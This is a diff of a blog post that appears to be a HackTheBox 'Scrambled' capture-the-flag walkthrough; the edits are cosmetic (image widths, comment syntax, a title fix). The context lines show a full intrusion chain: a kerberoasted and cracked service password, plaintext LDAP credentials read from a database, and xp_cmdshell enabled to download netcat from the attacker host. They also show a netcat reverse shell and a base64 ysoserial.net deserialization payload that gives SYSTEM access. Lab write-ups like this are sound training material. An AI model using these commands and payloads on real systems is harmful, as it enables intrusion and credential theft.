@@ -5,7 +5,7 @@ date: 2020-07-30
 comments: true
 image: /images/walkthroughs/hackthebox/scrambled/logo.png
 favicon: /images/walkthroughs/hackthebox/scrambled/logo.png
-description: HTB - Noter walkthrough
+description: HTB - Scrambled walkthrough
 ---
 
 # Scrambled
@@ -157,7 +157,7 @@ With no access to SMBs with anonymous and no shares enumeration, probably we hav
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/1_2_contact.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/1_2_contact.png" width="90%"/>
 </p>
 
 
@@ -285,7 +285,7 @@ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -reque
 Now we can copy the hash and try to crack it. Remember, kerberoasting attacks are useless if company are using strong passwords (they should also be outside any well-known wordlist). Anyway, it can be cracked offline, and a good practice is to enumerate password complexity from the AD, then load custom rules and pray to find it.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/2_0_crack.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/2_0_crack.png" width="90%"/>
 </p>
 
 **sqlsvc:Pegasus60**
@@ -372,18 +372,18 @@ SQL> SELECT system_user;
 ----------------------------------
 SCRM\administrator
 
-# Enumerate databases and look for one of our interest
+-- Enumerate databases and look for one of our interest
 SQL> SELECT DB_NAME(1);
 ----------------------------------
 master                                                                                                                             
 
-# Or get all DBs at once
+-- Or get all DBs at once
 SQL> SELECT concat(DB_NAME(1),':',DB_NAME(2),':',DB_NAME(3),':',DB_NAME(4),':',DB_NAME(5));
 ----------------------------------
 master:tempdb:model:msdb:ScrambleHR
 
 
-# All at once on mssql. Remembet that master..sysdatabases is equal to master.dbo.sysdatabases
+-- All at once on mssql. Remembet that master..sysdatabases is equal to master.dbo.sysdatabases
 SQL> SELECT name FROM master..sysdatabases;
 name   
 -----------------------------------
@@ -394,50 +394,50 @@ msdb
 ScrambleHR
 
 
-# Let's get the tables on the database and its ID for making the task easier
+-- Lets get the tables on the database and its ID for making the task easier
 SQL> select string_agg(concat(name,':',id), '|') from ScrambleHR..sysobjects where xtype='u'
 ---------------------------------------------------- 
 Employees:581577110|UserImport:597577167|Timesheets:613577224
 
 
-# Get all columns from the employees table (id 581577110)
+-- Get all columns from the employees table (id 581577110)
 SQL> select string_agg(name, '|') from ScrambleHR..syscolumns where id=581577110
 ----------------------------------------------------
 EmployeeID|FirstName|Manager|Role|Surname|Title
 
 
-# Colujmns from UserImport (kinda interesting with all LDAP user and pass)
+-- Columns from UserImport (kinda interesting with all LDAP user and pass)
 SQL> select string_agg(name, '|') from ScrambleHR..syscolumns where id=597577167
 -------------------------------------------------------------  
 IncludeGroups|LdapDomain|LdapPwd|LdapUser|RefreshInterval
 
 
-# Focus on that LDAP info. Retrieve all columns
+-- Focus on that LDAP info. Retrieve all columns
 SQL> select * from UserImport;
 LdapUser     LdapPwd          LdapDomain  RefreshInterval   IncludeGroups   
 --------------------------------------------------------------------   
 MiscSvc   ScrambledEggs9900   scrm.local        90               0
 
 
-# Wow plaintext passwords, I like them. We can try to execute some code with xp_cmdshell
+-- Wow plaintext passwords, I like them. We can try to execute some code with xp_cmdshell
 SQL> exec xp_cmdshell 'ping 10.10.14.3';
 [-] ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
 
 
-# If we are admins, we can reconfigure the execution policies
+-- If we are admins, we can reconfigure the execution policies
 SQL> select user;
 ---------------------  
 dbo 
 
 
-# We are admins from the database since we are dbo (default admin on MSSQL)
-# Enable execution, run reconfigure (to avoid errors)
+-- We are admins from the database since we are dbo (default admin on MSSQL)
+-- Enable execution, run reconfigure (to avoid errors)
 SQL> enable_xp_cmdshell
 [*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
 [*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 
 
-# Run the ping to our attack machine
+-- Run the ping to our attack machine
 SQL> exec xp_cmdshell 'ping 10.10.14.3';
 ---------------------------------------------
 Pinging 10.10.14.3 with 32 bytes of data:
@@ -455,20 +455,20 @@ We got the ping and the execution, so we can create a reverse shell to the machi
 Load netcat into the remote machine:
 
 ```bash
-# Attack machine
+-- Attack machine
 kali@kali:~/Tools/Windows/Tools/netcat-win32-1.12$ python3 -m http.server 5454   
 Serving HTTP on 0.0.0.0 port 5454 (http://0.0.0.0:5454/) ...
 10.129.228.11 - - [22/Sep/2022 13:43:45] "GET /nc64.exe HTTP/1.1" 200 -
 ```
 
 ```sql
-# Remote server
+-- Remote server
 SQL> xp_cmdshell powershell "Invoke-WebRequest -Uri http://10.10.14.3:5454/nc64.exe -Outfile C:\Temp\nc.exe"
 output                                                                             
 --------------------------------------------------------------------------------   
 NULL                                                                               
 
-# Create the reverse shell
+-- Create the reverse shell
 SQL> xp_cmdshell C:\Temp\nc.exe -e powershell 10.10.14.3 5455
 ```
 
@@ -508,7 +508,7 @@ Invoke-Command -Computer dc1 -Credential $cred -Command { C:\Temp\nc.exe -e powe
 And we are in again, now with _miscsvc_ and got the flag:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/5_0_miscsvc.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/5_0_miscsvc.png" width="90%"/>
 </p>
 
 ``` ba9c5ff5246df34b949858f8a37ad749 ```
@@ -583,20 +583,20 @@ We remember the photo of the client UI on the website for some debugging action,
 The first one is being used to upload an order. We can see that the client sends a serialized string to the server:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/6_3_uploadorder.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/6_3_upload.png" width="90%"/>
 </p>
 
 Then we can see the _GetOrders()_ function, calling to _DeserializeFromBase64(text)_. As far as we are concern, in the client, there is no sanitization on the input, if so, we will bypass it. If the server has no sanitization, we might look for a deserialization vulnerability.
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/6_1_deserialize.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/6_1_deserialize.png" width="90%"/>
 </p>
 
 Checking the _DeserializeFromBase64()_, we can see the BinaryFormatter.Deserialize() presumably using the user input without filtering. 
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/6_2_base64.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/6_2_base64.png" width="90%"/>
 </p>
 
 Deserialization process usually have high risks, especially when no filtering is applied to the input. The combination of .NET and BinaryFormatter is always promising due to the vulnerability across all platforms in .NET (more info at [Microsoft's security guide about serialization](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)). For this matter I use [ysosetial.net tool](https://github.com/pwntester/ysoserial.net) very handy, powerful and easy to use executable for Windows. You will have to execute it on your Windows VM and disable Live Protection from Windows Defender since its  payloads are blocked by this feature.
@@ -604,21 +604,19 @@ Deserialization process usually have high risks, especially when no filtering is
 We will choose the WindowsIdentity Gadget, since we want to get the execution into Windows and then the BinaryFormatter format. Then set the payload, I'm using the netcat script I have uploaded recently on the machine to make a reverse shell. Then the output format; we are going to connect with nc on the listening port and send the commands directly to the server in the expected format. To know that, I checked how the client send this request and we can see that the string is splitted in two parts by the character ";", then the first part is comapred with "QUIT", one of the available commands, so the first part is the command and the other is the parameter:
 
 ```html
-
 <COMMAND>;<PAYLOAD>
-
 ```
 
 Those are the available commands:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/6_4_commands.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/6_4_commands.png" width="90%"/>
 </p>
 
 And the "Scramble Request" builder:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/6_5_string.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/6_5_string.png" width="90%"/>
 </p>
 
 
@@ -637,12 +635,12 @@ Scrambled$ nc dc1.scrm.local 4411
 SCRAMBLECORP_ORDERS_V1.0.3;
 UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMndVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRRdU15QTFORFU0SWlCVGRHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L
 ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
-
 ```
 
 And we are inside as NT Authority:
 
-
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/scrambled/7_1_in.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/scrambled/7_1_in.png" width="90%"/>
 </p>
+
+Thanks for reading!
